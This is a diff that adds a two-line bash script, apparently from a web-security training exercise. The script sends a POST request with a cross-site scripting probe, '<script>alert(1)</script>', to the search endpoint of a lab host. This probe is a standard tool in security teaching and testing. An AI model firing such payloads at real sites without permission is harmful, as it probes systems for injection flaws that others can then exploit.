@@ -1,0 +1,2 @@
+#!/bin/bash
+curl -X POST http://web0x00.hbtn/search -d "query=<script>alert(1)</script>" -s
